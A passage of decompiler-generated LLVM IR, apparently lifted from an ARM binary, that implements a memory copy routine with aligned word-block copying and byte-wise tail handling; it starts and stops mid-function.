  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_171c0 = load i32, i32* @r1, align 4
  %v1_171c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_171c0 = sub i32 %v0_171c0, %v1_171c0
  %v3_171c0 = icmp ult i32 %v0_171c0, %v1_171c0
  %v4_171c0 = xor i32 %v1_171c0, %v0_171c0
  %v5_171c0 = xor i32 %v2_171c0, %v0_171c0
  %v6_171c0 = and i32 %v5_171c0, %v4_171c0
  %v7_171c0 = icmp slt i32 %v6_171c0, 0
  store i1 %v7_171c0, i1* %cpsr_v.global-to-local, align 1
  %v8_171c0 = icmp slt i32 %v2_171c0, 0
  store i1 %v8_171c0, i1* %cpsr_n.global-to-local, align 1
  %v9_171c0 = icmp eq i32 %v0_171c0, %v1_171c0
  store i1 %v9_171c0, i1* @cpsr_z, align 1
  br i1 %v3_171c0, label %dec_label_pc_1740c, label %dec_label_pc_171c8

dec_label_pc_171c8:                               ; preds = %entry
  br i1 %v9_171c0, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_171c8
  %merge = phi i32 [ %v0_171c0, %dec_label_pc_171c8 ], [ %v2_174a0, %bb143 ], [ %v11_174bc, %bb146 ], [ %v7_174bc, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_171c8
  %v5_171cc = inttoptr i32 %v1_171c0 to i8*
  store i8* %v5_171cc, i8** %stack_var_-8, align 4
  %v0_171d0 = load i32, i32* @r2, align 4
  %v2_171d0 = add i32 %v0_171d0, -4
  store i32 %v2_171d0, i32* %r2.global-to-local, align 4
  %v4_171d0 = sub i32 3, %v0_171d0
  %v5_171d0 = and i32 %v4_171d0, %v0_171d0
  %v6_171d0 = icmp slt i32 %v5_171d0, 0
  store i1 %v6_171d0, i1* %cpsr_v.global-to-local, align 1
  %v7_171d0 = icmp slt i32 %v2_171d0, 0
  store i1 %v7_171d0, i1* %cpsr_n.global-to-local, align 1
  %v5_171d4 = icmp slt i32 %v0_171d0, 4
  br i1 %v5_171d4, label %bb133, label %dec_label_pc_171d8

dec_label_pc_171d8:                               ; preds = %bb
  %v1_171d8 = urem i32 %v1_171c0, 4
  store i32 %v1_171d8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_171d8 = icmp eq i32 %v1_171d8, 0
  br i1 %v2_171d8, label %dec_label_pc_171e0, label %dec_label_pc_17284

dec_label_pc_171e0:                               ; preds = %dec_label_pc_171d8
  %v1_171e0 = urem i32 %v0_171c0, 4
  store i32 %v1_171e0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_171e0 = icmp eq i32 %v1_171e0, 0
  %extract.t = trunc i32 %v0_171c0 to i2
  br i1 %v2_171e0, label %dec_label_pc_171e8, label %dec_label_pc_172b4

dec_label_pc_171e8:                               ; preds = %dec_label_pc_171e0, %dec_label_pc_172ac
  %v0_1720093 = phi i32 [ %v1_171c0, %dec_label_pc_171e0 ], [ %v0_172fc76, %dec_label_pc_172ac ]
  %v0_171fc92 = phi i32 [ %v0_171c0, %dec_label_pc_171e0 ], [ %v0_172ac, %dec_label_pc_172ac ]
  %v0_171e8 = phi i32 [ %v2_171d0, %dec_label_pc_171e0 ], [ %v2_172a4, %dec_label_pc_172ac ]
  %v2_171e8 = add i32 %v0_171e8, -8
  store i32 %v2_171e8, i32* %r2.global-to-local, align 4
  %v4_171e8 = sub i32 7, %v0_171e8
  %v5_171e8 = and i32 %v4_171e8, %v0_171e8
  %v6_171e8 = icmp slt i32 %v5_171e8, 0
  store i1 %v6_171e8, i1* %cpsr_v.global-to-local, align 1
  %v7_171e8 = icmp slt i32 %v2_171e8, 0
  store i1 %v7_171e8, i1* %cpsr_n.global-to-local, align 1
  %v5_171ec = icmp slt i32 %v0_171e8, 8
  br i1 %v5_171ec, label %dec_label_pc_1723c, label %dec_label_pc_171f0

dec_label_pc_171f0:                               ; preds = %dec_label_pc_171e8
  %v2_171f0 = add i32 %v0_171e8, -28
  store i32 %v2_171f0, i32* %r2.global-to-local, align 4
  %v4_171f0 = sub i32 27, %v0_171e8
  %v5_171f0 = and i32 %v4_171f0, %v2_171e8
  %v6_171f0 = icmp slt i32 %v5_171f0, 0
  store i1 %v6_171f0, i1* %cpsr_v.global-to-local, align 1
  %v7_171f0 = icmp slt i32 %v2_171f0, 0
  store i1 %v7_171f0, i1* %cpsr_n.global-to-local, align 1
  %v5_171f4 = icmp slt i32 %v2_171e8, 20
  br i1 %v5_171f4, label %dec_label_pc_17228, label %dec_label_pc_171f8

dec_label_pc_171f8:                               ; preds = %dec_label_pc_171f0
  %v0_171f8 = load i32, i32* @r4, align 4
  store i32 %v0_171f8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_171fc

dec_label_pc_171fc:                               ; preds = %dec_label_pc_171fc.dec_label_pc_171fc_crit_edge, %dec_label_pc_171f8
  %v0_17200 = phi i32 [ %v12_17208, %dec_label_pc_171fc.dec_label_pc_171fc_crit_edge ], [ %v0_1720093, %dec_label_pc_171f8 ]
  %v0_171fc = phi i32 [ %v0_171fc.pre, %dec_label_pc_171fc.dec_label_pc_171fc_crit_edge ], [ %v0_171fc92, %dec_label_pc_171f8 ]
  %v1_171fc = inttoptr i32 %v0_171fc to i32*
  %v2_171fc = load i32, i32* %v1_171fc, align 4
  store i32 %v2_171fc, i32* %r3.global-to-local, align 4
  %v3_171fc = add i32 %v0_171fc, 4
  %v4_171fc = inttoptr i32 %v3_171fc to i32*
  %v5_171fc = load i32, i32* %v4_171fc, align 4
  store i32 %v5_171fc, i32* %r4.global-to-local, align 4
  %v6_171fc = add i32 %v0_171fc, 8
  %v7_171fc = inttoptr i32 %v6_171fc to i32*
  %v8_171fc = load i32, i32* %v7_171fc, align 4
  store i32 %v8_171fc, i32* %ip.global-to-local, align 4
  %v9_171fc = add i32 %v0_171fc, 12
  %v10_171fc = inttoptr i32 %v9_171fc to i32*
  %v11_171fc = load i32, i32* %v10_171fc, align 4
  store i32 %v11_171fc, i32* %lr.global-to-local, align 4
  %v12_171fc = add i32 %v0_171fc, 16
  store i32 %v12_171fc, i32* %r1.global-to-local, align 4
  %v1_17200 = inttoptr i32 %v0_17200 to i32*
  store i32 %v2_171fc, i32* %v1_17200, align 4
  %v3_17200 = add i32 %v0_17200, 4
  %v4_17200 = inttoptr i32 %v3_17200 to i32*
  %v5_17200 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17200, i32* %v4_17200, align 4
  %v6_17200 = add i32 %v0_17200, 8
  %v7_17200 = inttoptr i32 %v6_17200 to i32*
  %v8_17200 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_17200, i32* %v7_17200, align 4
  %v9_17200 = add i32 %v0_17200, 12
  %v10_17200 = inttoptr i32 %v9_17200 to i32*
  %v11_17200 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_17200, i32* %v10_17200, align 4
  %v12_17200 = add i32 %v0_17200, 16
  store i32 %v12_17200, i32* %r0.global-to-local, align 4
  %v0_17204 = load i32, i32* %r1.global-to-local, align 4
  %v1_17204 = inttoptr i32 %v0_17204 to i32*
  %v2_17204 = load i32, i32* %v1_17204, align 4
  store i32 %v2_17204, i32* %r3.global-to-local, align 4
  %v3_17204 = add i32 %v0_17204, 4
  %v4_17204 = inttoptr i32 %v3_17204 to i32*
  %v5_17204 = load i32, i32* %v4_17204, align 4
  store i32 %v5_17204, i32* %r4.global-to-local, align 4
  %v6_17204 = add i32 %v0_17204, 8
  %v7_17204 = inttoptr i32 %v6_17204 to i32*
  %v8_17204 = load i32, i32* %v7_17204, align 4
  store i32 %v8_17204, i32* @ip, align 4
  %v9_17204 = add i32 %v0_17204, 12
  %v10_17204 = inttoptr i32 %v9_17204 to i32*
  %v11_17204 = load i32, i32* %v10_17204, align 4
  store i32 %v11_17204, i32* @lr, align 4
  %v12_17204 = add i32 %v0_17204, 16
  store i32 %v12_17204, i32* @r1, align 4
  %v1_17208 = inttoptr i32 %v12_17200 to i32*
  store i32 %v2_17204, i32* %v1_17208, align 4
  %v3_17208 = add i32 %v0_17200, 20
  %v4_17208 = inttoptr i32 %v3_17208 to i32*
  %v5_17208 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17208, i32* %v4_17208, align 4
  %v6_17208 = add i32 %v0_17200, 24
  %v7_17208 = inttoptr i32 %v6_17208 to i32*
  %v8_17208 = load i32, i32* @ip, align 4
  store i32 %v8_17208, i32* %v7_17208, align 4
  %v9_17208 = add i32 %v0_17200, 28
  %v10_17208 = inttoptr i32 %v9_17208 to i32*
  %v11_17208 = load i32, i32* @lr, align 4
  store i32 %v11_17208, i32* %v10_17208, align 4
  %v12_17208 = add i32 %v0_17200, 32
  store i32 %v12_17208, i32* %r0.global-to-local, align 4
  %v0_1720c = load i32, i32* %r2.global-to-local, align 4
  %v2_1720c = add i32 %v0_1720c, -32
  store i32 %v2_1720c, i32* %r2.global-to-local, align 4
  %v6_17210 = icmp slt i32 %v0_1720c, 32
  br i1 %v6_17210, label %dec_label_pc_17214, label %dec_label_pc_171fc.dec_label_pc_171fc_crit_edge

dec_label_pc_171fc.dec_label_pc_171fc_crit_edge:  ; preds = %dec_label_pc_171fc
  %v0_171fc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_171fc

dec_label_pc_17214:                               ; preds = %dec_label_pc_171fc
  %v4_17214 = add i32 %v0_1720c, -16
  %v6_17214 = add i32 %v0_1720c, 2147483616
  %v7_17214 = and i32 %v4_17214, %v6_17214
  %v8_17214 = icmp slt i32 %v7_17214, 0
  store i1 %v8_17214, i1* %cpsr_v.global-to-local, align 1
  %v9_17214 = icmp slt i32 %v4_17214, 0
  store i1 %v9_17214, i1* %cpsr_n.global-to-local, align 1
  %v5_17218 = icmp slt i32 %v2_1720c, -16
  br i1 %v5_17218, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_17214
  %v6_17218 = load i32, i32* @r1, align 4
  %v7_17218 = inttoptr i32 %v6_17218 to i32*
  %v8_17218 = load i32, i32* %v7_17218, align 4
  store i32 %v8_17218, i32* %r3.global-to-local, align 4
  %v9_17218 = add i32 %v6_17218, 4
  %v10_17218 = inttoptr i32 %v9_17218 to i32*
  %v11_17218 = load i32, i32* %v10_17218, align 4
  store i32 %v11_17218, i32* %r4.global-to-local, align 4
  %v12_17218 = add i32 %v6_17218, 8
  %v13_17218 = inttoptr i32 %v12_17218 to i32*
  %v14_17218 = load i32, i32* %v13_17218, align 4
  store i32 %v14_17218, i32* @ip, align 4
  %v15_17218 = add i32 %v6_17218, 12
  %v16_17218 = inttoptr i32 %v15_17218 to i32*
  %v17_17218 = load i32, i32* %v16_17218, align 4
  store i32 %v17_17218, i32* @lr, align 4
  %v18_17218 = add i32 %v6_17218, 16
  store i32 %v18_17218, i32* @r1, align 4
  %v7_1721c = inttoptr i32 %v12_17208 to i32*
  store i32 %v8_17218, i32* %v7_1721c, align 4
  %v9_1721c = add i32 %v0_17200, 36
  %v10_1721c = inttoptr i32 %v9_1721c to i32*
  %v11_1721c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_1721c, i32* %v10_1721c, align 4
  %v12_1721c = add i32 %v0_17200, 40
  %v13_1721c = inttoptr i32 %v12_1721c to i32*
  %v14_1721c = load i32, i32* @ip, align 4
  store i32 %v14_1721c, i32* %v13_1721c, align 4
  %v15_1721c = add i32 %v0_17200, 44
  %v16_1721c = inttoptr i32 %v15_1721c to i32*
  %v17_1721c = load i32, i32* @lr, align 4
  store i32 %v17_1721c, i32* %v16_1721c, align 4
  %v18_1721c = add i32 %v0_17200, 48
  store i32 %v18_1721c, i32* %r0.global-to-local, align 4
  %v6_17220 = load i32, i32* %r2.global-to-local, align 4
  %v7_17220 = add i32 %v6_17220, -16
  store i32 %v7_17220, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17214, %bb130
  %v3_17230102 = phi i32 [ %v12_17208, %dec_label_pc_17214 ], [ %v18_1721c, %bb130 ]
  %v0_1722896 = phi i32 [ %v2_1720c, %dec_label_pc_17214 ], [ %v7_17220, %bb130 ]
  %v2_17224 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17224, i32* @r4, align 4
  br label %dec_label_pc_17228

dec_label_pc_17228:                               ; preds = %dec_label_pc_171f0, %.thread2
  %v3_17230101 = phi i32 [ %v0_1720093, %dec_label_pc_171f0 ], [ %v3_17230102, %.thread2 ]
  %v0_17228 = phi i32 [ %v2_171f0, %dec_label_pc_171f0 ], [ %v0_1722896, %.thread2 ]
  %v1_17228 = add i32 %v0_17228, 20
  store i32 %v1_17228, i32* %r2.global-to-local, align 4
  %v3_17228 = sub i32 0, %v0_17228
  %v4_17228 = and i32 %v1_17228, %v3_17228
  %v5_17228 = icmp slt i32 %v4_17228, 0
  store i1 %v5_17228, i1* %cpsr_v.global-to-local, align 1
  %v6_17228 = icmp slt i32 %v1_17228, 0
  store i1 %v6_17228, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1722c

dec_label_pc_1722c:                               ; preds = %.thread118, %dec_label_pc_17228
  %v0_1723c.pre149 = phi i32 [ %v0_1723c.pre, %.thread118 ], [ %v1_17228, %dec_label_pc_17228 ]
  %v3_17230 = phi i32 [ %v3_1723099119, %.thread118 ], [ %v3_17230101, %dec_label_pc_17228 ]
  %v1_17234 = phi i1 [ %v1_17238, %.thread118 ], [ %v5_17228, %dec_label_pc_17228 ]
  %v0_17234 = phi i1 [ %v0_17238, %.thread118 ], [ %v6_17228, %dec_label_pc_17228 ]
  %v2_1722c = xor i1 %v1_17234, %v0_17234
  br i1 %v2_1722c, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_1722c
  %v3_1722c = load i32, i32* @r1, align 4
  %v4_1722c = inttoptr i32 %v3_1722c to i32*
  %v5_1722c = load i32, i32* %v4_1722c, align 4
  store i32 %v5_1722c, i32* %r3.global-to-local, align 4
  %v6_1722c = add i32 %v3_1722c, 4
  %v7_1722c = inttoptr i32 %v6_1722c to i32*
  %v8_1722c = load i32, i32* %v7_1722c, align 4
  store i32 %v8_1722c, i32* @ip, align 4
  %v9_1722c = add i32 %v3_1722c, 8
  %v10_1722c = inttoptr i32 %v9_1722c to i32*
  %v11_1722c = load i32, i32* %v10_1722c, align 4
  store i32 %v11_1722c, i32* @lr, align 4
  %v12_1722c = add i32 %v3_1722c, 12
  store i32 %v12_1722c, i32* @r1, align 4
  %v4_17230 = inttoptr i32 %v3_17230 to i32*
  store i32 %v5_1722c, i32* %v4_17230, align 4
  %v6_17230 = add i32 %v3_17230, 4
  %v7_17230 = inttoptr i32 %v6_17230 to i32*
  %v8_17230 = load i32, i32* @ip, align 4
  store i32 %v8_17230, i32* %v7_17230, align 4
  %v9_17230 = add i32 %v3_17230, 8
  %v10_17230 = inttoptr i32 %v9_17230 to i32*
  %v11_17230 = load i32, i32* @lr, align 4
  store i32 %v11_17230, i32* %v10_17230, align 4
  %v12_17230 = add i32 %v3_17230, 12
  store i32 %v12_17230, i32* %r0.global-to-local, align 4
  %v3_17234 = load i32, i32* %r2.global-to-local, align 4
  %v4_17234 = add i32 %v3_17234, -12
  store i32 %v4_17234, i32* %r2.global-to-local, align 4
  %v6_17234 = sub i32 11, %v3_17234
  %v7_17234 = and i32 %v6_17234, %v3_17234
  %v8_17234 = icmp slt i32 %v7_17234, 0
  store i1 %v8_17234, i1* %cpsr_v.global-to-local, align 1
  %v9_17234 = icmp slt i32 %v4_17234, 0
  store i1 %v9_17234, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_1722c, %bb131
  %v0_1723c.pre = phi i32 [ %v4_17234, %bb131 ], [ %v0_1723c.pre149, %dec_label_pc_1722c ]
  %v3_1723099119 = phi i32 [ %v12_17230, %bb131 ], [ %v3_17230, %dec_label_pc_1722c ]
  %v1_17238 = phi i1 [ %v8_17234, %bb131 ], [ %v1_17234, %dec_label_pc_1722c ]
  %v0_17238 = phi i1 [ %v9_17234, %bb131 ], [ %v0_17234, %dec_label_pc_1722c ]
  %v2_17238 = xor i1 %v1_17238, %v0_17238
  br i1 %v2_17238, label %dec_label_pc_1723c, label %dec_label_pc_1722c

dec_label_pc_1723c:                               ; preds = %.thread118, %dec_label_pc_171e8
  %v7_1724c = phi i32 [ %v0_1720093, %dec_label_pc_171e8 ], [ %v3_1723099119, %.thread118 ]
  %v0_1723c = phi i32 [ %v2_171e8, %dec_label_pc_171e8 ], [ %v0_1723c.pre, %.thread118 ]
  %v2_1723c = add i32 %v0_1723c, 8
  store i32 %v2_1723c, i32* %r2.global-to-local, align 4
  %v4_1723c = sub i32 0, %v0_1723c
  %v5_1723c = and i32 %v2_1723c, %v4_1723c
  %v6_1723c = icmp slt i32 %v5_1723c, 0
  store i1 %v6_1723c, i1* %cpsr_v.global-to-local, align 1
  %v7_1723c = icmp slt i32 %v2_1723c, 0
  store i1 %v7_1723c, i1* %cpsr_n.global-to-local, align 1
  %v5_17240 = icmp slt i32 %v0_1723c, -8
  br i1 %v5_17240, label %bb133, label %dec_label_pc_17244

dec_label_pc_17244:                               ; preds = %dec_label_pc_1723c
  %v6_17244 = add i32 %v0_1723c, 4
  store i32 %v6_17244, i32* %r2.global-to-local, align 4
  %v8_17244 = sub i32 -5, %v0_1723c
  %v9_17244 = and i32 %v8_17244, %v2_1723c
  %v10_17244 = icmp slt i32 %v9_17244, 0
  store i1 %v10_17244, i1* %cpsr_v.global-to-local, align 1
  %v11_17244 = icmp slt i32 %v6_17244, 0
  store i1 %v11_17244, i1* %cpsr_n.global-to-local, align 1
  %v5_17248 = icmp slt i32 %v2_1723c, 4
  %v6_17248 = load i32, i32* @r1, align 4
  %v7_17248 = inttoptr i32 %v6_17248 to i32*
  %v8_17248 = load i32, i32* %v7_17248, align 4
  store i32 %v8_17248, i32* %r3.global-to-local, align 4
  %v10_17248 = add i32 %v6_17248, 4
  br i1 %v5_17248, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_17244
  store i32 %v10_17248, i32* @r1, align 4
  %v8_1724c = inttoptr i32 %v7_1724c to i32*
  store i32 %v8_17248, i32* %v8_1724c, align 4
  %v9_1724c = load i32, i32* %r0.global-to-local, align 4
  %v10_1724c = add i32 %v9_1724c, 4
  store i32 %v10_1724c, i32* %r0.global-to-local, align 4
  %v0_1725c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_17244
  %v10_17250 = inttoptr i32 %v10_17248 to i32*
  %v11_17250 = load i32, i32* %v10_17250, align 4
  store i32 %v11_17250, i32* @ip, align 4
  %v12_17250 = add i32 %v6_17248, 8
  store i32 %v12_17250, i32* @r1, align 4
  %v7_17254 = inttoptr i32 %v7_1724c to i32*
  store i32 %v8_17248, i32* %v7_17254, align 4
  %v9_17254 = add i32 %v7_1724c, 4
  %v10_17254 = inttoptr i32 %v9_17254 to i32*
  %v11_17254 = load i32, i32* @ip, align 4
  store i32 %v11_17254, i32* %v10_17254, align 4
  %v12_17254 = add i32 %v7_1724c, 8
  store i32 %v12_17254, i32* %r0.global-to-local, align 4
  %v6_17258 = load i32, i32* %r2.global-to-local, align 4
  %v7_17258 = add i32 %v6_17258, -4
  store i32 %v7_17258, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_1723c, %bb, %dec_label_pc_17404, %dec_label_pc_1732c, %dec_label_pc_17398, %bb132
  %v2_1726c = phi i32 [ %v10_1724c, %.thread6 ], [ %v0_172fc76, %.thread12 ], [ %v7_1724c, %dec_label_pc_1723c ], [ %v1_171c0, %bb ], [ %v2_1726c114, %dec_label_pc_17404 ], [ %v2_1726c113, %dec_label_pc_1732c ], [ %v2_1726c112, %dec_label_pc_17398 ], [ %v12_17254, %bb132 ]
  %v0_1725c = phi i32 [ %v0_1725c.pre, %.thread6 ], [ %v2_172a4, %.thread12 ], [ %v2_1723c, %dec_label_pc_1723c ], [ %v2_171d0, %bb ], [ %v0_1725c110, %dec_label_pc_17404 ], [ %v0_1725c109, %dec_label_pc_1732c ], [ %v0_1725c108, %dec_label_pc_17398 ], [ %v7_17258, %bb132 ]
  %v1_1725c = add i32 %v0_1725c, 4
  store i32 %v1_1725c, i32* @r2, align 4
  %v3_1725c = sub i32 0, %v0_1725c
  %v4_1725c = and i32 %v1_1725c, %v3_1725c
  %v5_1725c = icmp slt i32 %v4_1725c, 0
  store i1 %v5_1725c, i1* %cpsr_v.global-to-local, align 1
  %v6_1725c = icmp slt i32 %v1_1725c, 0
  store i1 %v6_1725c, i1* %cpsr_n.global-to-local, align 1
  %v7_1725c = icmp eq i32 %v1_1725c, 0
  store i1 %v7_1725c, i1* @cpsr_z, align 1
  br i1 %v7_1725c, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_17260 = load i8*, i8** %stack_var_-8, align 4
  %v4_17260 = ptrtoint i8* %v3_17260 to i32
  store i32 %v4_17260, i32* %r0.global-to-local, align 4
  ret i32 %v4_17260

bb135:                                            ; preds = %bb133
  %v1_17264 = add i32 %v0_1725c, 2
  %v3_17264 = sub i32 -3, %v0_1725c
  %v4_17264 = and i32 %v3_17264, %v1_1725c
  %v5_17264 = icmp slt i32 %v4_17264, 0
  store i1 %v5_17264, i1* %cpsr_v.global-to-local, align 1
  %v6_17264 = icmp slt i32 %v1_17264, 0
  store i1 %v6_17264, i1* %cpsr_n.global-to-local, align 1
  %v7_17264 = icmp eq i32 %v1_1725c, 2
  store i1 %v7_17264, i1* @cpsr_z, align 1
  %v0_17268 = load i32, i32* @r1, align 4
  %v1_17268 = inttoptr i32 %v0_17268 to i8*
  %v2_17268 = load i8, i8* %v1_17268, align 1
  %v3_17268 = zext i8 %v2_17268 to i32
  store i32 %v3_17268, i32* %r3.global-to-local, align 4
  %v5_17268 = add i32 %v0_17268, 1
  store i32 %v5_17268, i32* @r1, align 4
  %v3_1726c = inttoptr i32 %v2_1726c to i8*
  store i8 %v2_17268, i8* %v3_1726c, align 1
  %v4_1726c = load i32, i32* %r0.global-to-local, align 4
  %v5_1726c = add i32 %v4_1726c, 1
  store i32 %v5_1726c, i32* %r0.global-to-local, align 4
  %v0_17270 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17270 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_17270 = xor i1 %v0_17270, %v1_17270
  br i1 %v2_17270, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_17270 = load i32, i32* @r1, align 4
  %v4_17270 = inttoptr i32 %v3_17270 to i8*
  %v5_17270 = load i8, i8* %v4_17270, align 1
  %v6_17270 = zext i8 %v5_17270 to i32
  store i32 %v6_17270, i32* %r3.global-to-local, align 4
  %v8_17270 = add i32 %v3_17270, 1
  store i32 %v8_17270, i32* @r1, align 4
  %v6_17274 = inttoptr i32 %v5_1726c to i8*
  store i8 %v5_17270, i8* %v6_17274, align 1
  %v7_17274 = load i32, i32* %r0.global-to-local, align 4
  %v8_17274 = add i32 %v7_17274, 1
  store i32 %v8_17274, i32* %r0.global-to-local, align 4
  %v1_17278.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17278.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_1727c = phi i32 [ %v8_17274, %bb136 ], [ %v5_1726c, %bb135 ]
  %v2_1727c = phi i1 [ %v2_17278.pre, %bb136 ], [ %v1_17270, %bb135 ]
  %v1_1727c = phi i1 [ %v1_17278.pre, %bb136 ], [ %v0_17270, %bb135 ]
  %v0_17278 = load i1, i1* @cpsr_z, align 1
  %v3_17278 = xor i1 %v2_1727c, %v1_1727c
  %v4_17278 = or i1 %v0_17278, %v3_17278
  br i1 %v4_17278, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_17278 = load i32, i32* @r1, align 4
  %v6_17278 = inttoptr i32 %v5_17278 to i8*
  %v7_17278 = load i8, i8* %v6_17278, align 1
  %v8_17278 = zext i8 %v7_17278 to i32
  store i32 %v8_17278, i32* %r3.global-to-local, align 4
  %v10_17278 = add i32 %v5_17278, 1
  store i32 %v10_17278, i32* @r1, align 4
  %v8_1727c = inttoptr i32 %v7_1727c to i8*
  store i8 %v7_17278, i8* %v8_1727c, align 1
  %v9_1727c = load i32, i32* %r0.global-to-local, align 4
  %v10_1727c = add i32 %v9_1727c, 1
  store i32 %v10_1727c, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_17280 = load i8*, i8** %stack_var_-8, align 4
  %v3_17280 = ptrtoint i8* %v2_17280 to i32
  store i32 %v3_17280, i32* %r0.global-to-local, align 4
  ret i32 %v3_17280

dec_label_pc_17284:                               ; preds = %dec_label_pc_171d8
  %v1_17284 = sub nsw i32 4, %v1_171d8
  store i32 %v1_17284, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_17288 = icmp ult i32 %v1_17284, 2
  store i1 %v8_17288, i1* %cpsr_n.global-to-local, align 1
  %v1_1728c = inttoptr i32 %v0_171c0 to i8*
  %v2_1728c = load i8, i8* %v1_1728c, align 1
  %v3_1728c = zext i8 %v2_1728c to i32
  store i32 %v3_1728c, i32* %r3.global-to-local, align 4
  %v5_1728c = add i32 %v0_171c0, 1
  store i32 %v5_1728c, i32* @r1, align 4
  store i8 %v2_1728c, i8* %v5_171cc, align 1
  %v4_17290 = load i32, i32* %r0.global-to-local, align 4
  %v5_17290 = add i32 %v4_17290, 1
  store i32 %v5_17290, i32* %r0.global-to-local, align 4
  br i1 %v8_17288, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_17284
  %v9_17288 = icmp eq i32 %v1_17284, 2
  %v6_17294 = load i32, i32* @r1, align 4
  %v7_17294 = inttoptr i32 %v6_17294 to i8*
  %v8_17294 = load i8, i8* %v7_17294, align 1
  %v9_17294 = zext i8 %v8_17294 to i32
  store i32 %v9_17294, i32* %r3.global-to-local, align 4
  %v11_17294 = add i32 %v6_17294, 1
  store i32 %v11_17294, i32* @r1, align 4
  %v9_17298 = inttoptr i32 %v5_17290 to i8*
  store i8 %v8_17294, i8* %v9_17298, align 1
  %v10_17298 = load i32, i32* %r0.global-to-local, align 4
  %v11_17298 = add i32 %v10_17298, 1
  store i32 %v11_17298, i32* %r0.global-to-local, align 4
  br i1 %v9_17288, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_1729c = load i32, i32* @r1, align 4
  %v9_1729c = inttoptr i32 %v8_1729c to i8*
  %v10_1729c = load i8, i8* %v9_1729c, align 1
  %v11_1729c = zext i8 %v10_1729c to i32
  store i32 %v11_1729c, i32* %r3.global-to-local, align 4
  %v13_1729c = add i32 %v8_1729c, 1
  store i32 %v13_1729c, i32* @r1, align 4
  %v11_172a0 = inttoptr i32 %v11_17298 to i8*
  store i8 %v10_1729c, i8* %v11_172a0, align 1
  %v12_172a0 = load i32, i32* %r0.global-to-local, align 4
  %v13_172a0 = add i32 %v12_172a0, 1
  store i32 %v13_172a0, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_17284, %bb139
  %v0_172fc76 = phi i32 [ %v11_17298, %bb138 ], [ %v5_17290, %dec_label_pc_17284 ], [ %v13_172a0, %bb139 ]
  %v0_172a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_172a4 = load i32, i32* @ip, align 4
  %v2_172a4 = sub i32 %v0_172a4, %v1_172a4
  store i32 %v2_172a4, i32* %r2.global-to-local, align 4
  %v4_172a4 = xor i32 %v1_172a4, %v0_172a4
  %v5_172a4 = xor i32 %v2_172a4, %v0_172a4
  %v6_172a4 = and i32 %v5_172a4, %v4_172a4
  %v7_172a4 = icmp slt i32 %v6_172a4, 0
  store i1 %v7_172a4, i1* %cpsr_v.global-to-local, align 1
  %v8_172a4 = icmp slt i32 %v2_172a4, 0
  store i1 %v8_172a4, i1* %cpsr_n.global-to-local, align 1
  %v5_172a8 = icmp slt i32 %v0_172a4, %v1_172a4
  br i1 %v5_172a8, label %bb133, label %dec_label_pc_172ac

dec_label_pc_172ac:                               ; preds = %.thread12
  %v0_172ac = load i32, i32* @r1, align 4
  %v1_172ac = urem i32 %v0_172ac, 4
  store i32 %v1_172ac, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_172ac = icmp eq i32 %v1_172ac, 0
  %extract.t124 = trunc i32 %v0_172ac to i2
  br i1 %v2_172ac, label %dec_label_pc_171e8, label %dec_label_pc_172b4

dec_label_pc_172b4:                               ; preds = %dec_label_pc_171e0, %dec_label_pc_172ac
  %v0_172fc75 = phi i32 [ %v1_171c0, %dec_label_pc_171e0 ], [ %v0_172fc76, %dec_label_pc_172ac ]
  %v0_173a8 = phi i32 [ %v2_171d0, %dec_label_pc_171e0 ], [ %v2_172a4, %dec_label_pc_172ac ]
  %v0_172bc.off0 = phi i2 [ %extract.t, %dec_label_pc_171e0 ], [ %extract.t124, %dec_label_pc_172ac ]
